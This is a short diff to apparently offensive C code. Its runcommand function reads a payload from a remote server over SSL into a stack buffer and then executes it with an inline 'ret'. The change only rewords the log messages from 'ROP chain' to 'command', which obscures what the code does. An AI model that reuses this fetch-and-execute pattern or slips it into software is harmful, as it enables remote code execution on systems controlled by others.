@@ -64,14 +64,14 @@ void log(const char *format, ...) {
 void runcommand() {
     int len;
     char command[0x2000];
-    log("Read ROP chain from server...\n");
+    log("Read command from server...\n");
     len = SSL_read(ssl, command, sizeof(command));
     closeconnection();
     if (len < 0) {
         log("Error!!!!\n");
         exit(1);
     }
-    log("Start execute ROP chain...\n");
+    log("Start execute command...\n");
     __asm__(
         "ret\n\t"
     );
